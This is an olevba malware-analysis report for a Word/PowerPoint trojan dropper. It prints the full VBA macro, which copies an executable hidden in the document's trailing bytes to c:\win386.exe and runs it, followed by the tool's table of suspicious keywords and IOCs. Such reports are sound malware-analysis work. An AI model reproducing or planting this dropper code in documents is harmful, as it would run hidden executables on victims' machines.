olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.Slide-43cd056760fbd02e3c4565f8e76d0ad3f6b079f1
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan-Dropper.MSWord.Slide-43cd056760fbd02e3c4565f8e76d0ad3f6b079f1 
in file: Trojan-Dropper.MSWord.Slide-43cd056760fbd02e3c4565f8e76d0ad3f6b079f1 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
On Error Resume Next
   Dim buffer(65536) As Byte
   Dim h, h2, j, i, k As Long
   
   h = CreateFile(ActivePresentation.FullName, &H80000000, 1 + 2, 0, 3, 0, 0)
   h2 = CreateFile("c:\win386.exe", &H40000000, 0, 0, 2, 0, 0)
   If h = -1 Then
      Exit Sub
   End If
   k = SetFilePointer(h, -42496, nil, 2)
   Do
      i = ReadFile(h, buffer(0), 65536, j, 0)
      i = WriteFile(h2, buffer(0), j, j, 0)
   Loop Until j < 65536
   
   CloseHandle (h)
   CloseHandle (h2)
Shell ("c:\win386.exe")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |win386.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

